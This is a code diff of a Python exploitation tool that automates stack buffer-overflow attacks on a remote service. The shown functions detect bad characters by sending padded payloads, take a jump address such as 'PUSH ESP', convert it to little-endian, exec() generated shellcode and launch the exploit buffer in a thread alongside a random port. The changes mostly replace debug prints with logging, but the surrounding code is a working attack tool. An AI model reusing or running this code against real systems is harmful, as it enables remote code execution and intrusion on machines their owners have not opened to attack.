@@ -83,9 +83,6 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
 
         reset_bin()
 
-        # TODO: create a much more efficient way than this shit down below!
-        print("all_characters: ", all_characters)
-
         if loops == 0:
             payload = prefix+" "+"A" * \
                 (length_of_overflow-len(all_characters)) + \
@@ -94,8 +91,8 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
             payload = prefix+" "+"A" * \
                 (length_of_overflow-len(all_characters)) + \
                 "\\x"+"\\x".join(all_characters)
-        print(f"len_of_overflow: {length_of_overflow}")
-        print("Sending: ", payload)
+        logging_console(f"Length of overflow: {length_of_overflow}", "INFO")
+        logging_console(f"Sending payload...", "INFO")
         connected = False
         for i in range(1, 10):
             try:
@@ -115,10 +112,7 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
             s.recv(1024)
         except:
             pass
-        exec(f"""s.send(bytes('{payload}', encoding="latin1"))""")
-        exec(f"print(len('{payload}'))")
-        # exec(f"print('{payload}')")
-        # s.send(bytes(payload, encoding="latin1"))
+        exec(f"""s.send(bytes('{payload}', encoding="latin1"))""")  # to send bytes and not 'python converted bytes'. The difference is the bytes needed should look like `\xAB\xAC` but the python-bytes look like `\\xAB\\xAC`
         try:
             s.recv(1024)
         except:
@@ -138,7 +132,6 @@ def start_bad_char_detection(prefix, length_of_overflow, r_ip_port, timeout=1):
 
         tries = 0
         bad_chars_save.append(bad_chars)
-        print("Bad_char: ", bad_chars_save[bad_chars_save.index(bad_chars)])
         while not check_format(bad_chars=bad_chars_save[bad_chars_save.index(bad_chars)]) and tries < 3:
             tries += 1
             bad_chars_save.remove(bad_chars)
@@ -171,8 +164,6 @@ def exploit_buffer_setup(shell_code, addr, prefix, offset):
 
 
 def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port, timeout):
-    # print("Final addr: ", bytes(f'\\x{str(addr)[5:7]}', encoding="latin1")+str(addr).split('\\\\')[1][4:-1].encode('latin1'))
-
     payload_thread = threading.Thread(
         target=exploit_buffer_setup, args=([shell_code, addr, prefix, offset]))
     payload_thread.start()
@@ -243,7 +234,6 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
         s = connect(r_ip_port)
         logging_console("Connected!"+" "*10, "POSITIVE")
     except Exception as e:
-        print("\n\n"+e.args[0], e)
         logging_console(
             "Connection timeout, could not connect. Executing ping test...", "WARNING")
         if not host_up(r_ip_port[0]):
@@ -294,11 +284,8 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
             "Type in address where i.e. `PUSH ESP` is found: (format: ADDRESS without 0x)", "QUESTION")
 
     if convention == "little":
-        print("Addr before le: ", addr)
         addr = little_endian(addr)
-        print("Addr after le: ", addr)
-    else:
-        print("Convention is not le, it's: ", convention)
+
     random_port = random.randint(1100, 65000)
     bad_chars = ''.join(bad_chars)
     shell_code_thread = threading.Thread(
@@ -323,20 +310,11 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
 
     # exploitation
     bad_chars = ''.join(bad_chars)
-    #print("bad_chars: ", bad_chars)
-    #print("shell_code before exec(): ", shell_code)
     exec(shell_code)
-    #exec(f"shell_code = buf")
-    #print("shell_code after exec(): ", shell_code)
-    #print("addr: ", addr)
-    #print("prefix: ", prefix)
-    #print("offset: ", offset)
-    #print("offset_user: ", offset_user)
     exec("global xbuf; xbuf=buf")
 
     # Change the address to the needed format
     addr = binascii.unhexlify(addr)
-    print("Addr: > > ", addr)
 
     start_exploitation(xbuf, addr, prefix.replace('\\\\', '\\').encode(
         'latin1'), offset, random_port, r_ip_port, timeout)
